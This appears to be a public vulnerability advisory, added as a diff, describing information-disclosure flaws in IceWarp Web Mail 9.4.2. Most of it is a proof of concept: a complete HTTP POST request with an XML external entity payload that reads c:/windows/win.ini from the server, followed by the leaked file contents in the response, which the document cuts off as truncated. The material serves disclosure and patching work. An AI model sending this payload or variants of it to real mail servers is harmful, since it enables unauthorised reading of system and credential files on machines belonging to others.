@@ -1,0 +1,54 @@
+source: http://www.securityfocus.com/bid/49753/info
+
+IceWarp Web Mail is prone to multiple information-disclosure vulnerabilities.
+
+Attackers can exploit these issues to gain access to potentially sensitive information, and possibly cause denial-of-service conditions; other attacks may also be possible. 
+
+Proof-of-Concept:
+
+The following POST request was sent to the host A.B.C.D where the IceWarp mail
+server was running:
+
+REQUEST 
+========= 
+POST /-.._._.--.._1243848280/server/webmail.php HTTP/1.1 
+Host:A.B.C.D 
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101
+Firefox/5.0 
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
+Accept-Language:en-gb,en;q=0.5i've 
+Accept-Encoding: gzip, deflate 
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 
+Proxy-Connection: keep-alive 
+Referer: http://A.B.C.D 
+Content-Length: 249 
+Content-Type: application/xml; 
+charset=UTF-8
+Pragma: no-cache 
+Cache-Control: no-cache
+
+<!DOCTYPE foo [<!ENTITY xxeb91c4 SYSTEM "file:///c:/windows/win.ini"> ]><iq
+type="set"><query xmlns="webmail:iq:auth"><username>test&xxeb91c4;</username><digest>828cd27c6fb73ee32674602e9c5521f005c614f5fb9266fd071dab323b5079e02d47a421c01df2efffcd2bdb221e15bf2baa4acefe38f264d92d152878ca4d33</digest><method>RSA</method></query></iq>
+
+RESPONSE: 
+========== 
+HTTP/1.1 200 OK 
+Server: IceWarp/9.4.2 
+Date: Wed, 20 Jul
+2011 10:04:56 GMT 
+Expires: Thu, 19 Nov 1981 08:52:00 GMT 
+Cache-Control:no-store, no-cache, must-revalidate, post-check=0, pre-check=0 
+Pragma: no-cache
+Content-Type: text/xml 
+Vary: Accept-Encoding 
+Content-Length: 1113
+
+<?xml version="1.0" encoding="utf-8"?><iq type="error"><error
+uid="login_invalid">test; for 16-bit app support 
+[fonts] 
+[extensions] 
+[mci extensions] 
+[files] 
+[Mail] 
+MAPI=1
+....TRUNCATED
